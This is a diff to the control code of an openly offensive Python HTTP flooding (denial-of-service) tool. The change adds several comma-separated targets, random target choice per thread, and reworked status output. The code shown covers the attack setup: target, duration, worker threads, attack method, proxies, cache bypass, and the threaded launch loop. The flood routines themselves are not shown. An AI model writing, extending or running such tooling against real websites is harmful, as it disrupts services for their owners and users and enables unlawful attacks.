@@ -40,8 +40,8 @@ try:
     import urllib # url parsing
     import threading # threaded attacks
     import json # parsing json, and creating json objects
-    import time # delay between attacks
-    import random # picking random stuff
+    import time # delay between attacks and time calculation
+    from random import choice # picking random stuff
     import netaddr # stuff with ip addresses
     import sqlite3 # database
     import textwrap # for the argparser module
@@ -113,7 +113,7 @@ SOFTWARE.
 ''', argument_default=argparse.SUPPRESS, allow_abbrev=False)
 
     # add arguments
-    parser.add_argument('-t',       '--target-url',      action='store',      dest='target_url',  metavar="target url",   type=str,    help="Target url to attack", default=None)
+    parser.add_argument('-t',       '--target',          action='store',      dest='target_url',  metavar="target url",   type=str,    help="Target url(s) to attack, seperated by \",\"", default=None)
     parser.add_argument('-d',       '--attack-duration', action='store',      dest='duration',    metavar='duration',     type=int,    help='Attack length in seconds', default=100)
     parser.add_argument('-w',       '--workers',         action='store',      dest='workers',     metavar='workers',      type=int,    help='Number of threads/workers to spawn', default=40)
     parser.add_argument('-m',       '--method',          action='store',      dest='method',      metavar='method',       type=str,    help='Attack method/vector to use', default='GET')
@@ -150,6 +150,11 @@ SOFTWARE.
 
     if not args['target_url']: # check if the "-t/--target-url" argument has been passed
         sys.exit('\n - Please specify your target.\n')
+    
+    if ',' in args['target_url']: # multiple targets specified
+        Core.targets = args['target_url'].split(',')
+    else:
+        Core.targets = [args['target_url']]
 
     attack_method = args['method'].upper()
     if not Core.methods.get(attack_method): # if the method does not exist
@@ -170,7 +175,12 @@ SOFTWARE.
             sys.exit(f'\n - Error, no proxies collected, maybe wrong file?\n')
     
     print(' + Current attack configuration:')
-    print(f'   - Target: {args["target_url"]}')
+
+    if not Core.targets:
+        print(f'   - Target: {args["target_url"]}')
+    else:
+        print(f'   - Targets: {", ".join(Core.targets)}')
+
     print(f'   - Duration: {utils().Sec2Str(args["duration"])}')
     print(f'   - Workers: {str(args["workers"])}')
     print(f'   - Method/Vector: {args["method"]}')
@@ -201,11 +211,19 @@ SOFTWARE.
 
     Core.bypass_cache = args['bypass_cache']
 
-    print('\n + Launching attack.')
+    print('\n + Building threads, this could take a while.')
     stoptime, threadbox = time.time() + args['duration'], []
     for _ in range(args["workers"]):
         try:
-            kaboom = threading.Thread(target=Core.methods.get(attack_method)['func'], args=(attack_id, args['target_url'], stoptime,))
+            kaboom = threading.Thread(
+                target=Core.methods[attack_method]['func'], # parse the function
+                args=(
+                    attack_id, # attack id
+                    choice(Core.targets), # pick a random target from the list
+                    stoptime, # stop time
+                )
+            )
+            
             threadbox.append(kaboom)
             kaboom.start()
 
@@ -217,18 +235,19 @@ SOFTWARE.
         except Exception as e:
             print(f' - Failed to launch thread: {str(e).rstrip()}')
     
+    print('\n + Starting attack')
     Core.attackrunning = True # all threads have launched, lets start the attack
 
     s_start = timer()
     while 1:
         try:
-            utils().clear()
+            #utils().clear()
 
             sent = str(Core.infodict[attack_id]['req_sent'])
             failed = str(Core.infodict[attack_id]['req_fail'])
             total = str(Core.infodict[attack_id]['req_total'])
 
-            print(f' + Target: {args["target_url"]}')
+            print(f' + Target(s): {", ".join(Core.targets)}')
             print(f' + Sent: {sent}')
             print(f' + Failed: {failed}')
             print(f' + Total: {total}')
@@ -240,7 +259,7 @@ SOFTWARE.
             Core.killattack = True
             break
     
-    utils().clear()
+    #utils().clear()
     print(' + Killing all threads, hold on.')
     for thread in threadbox:
         thread.join()
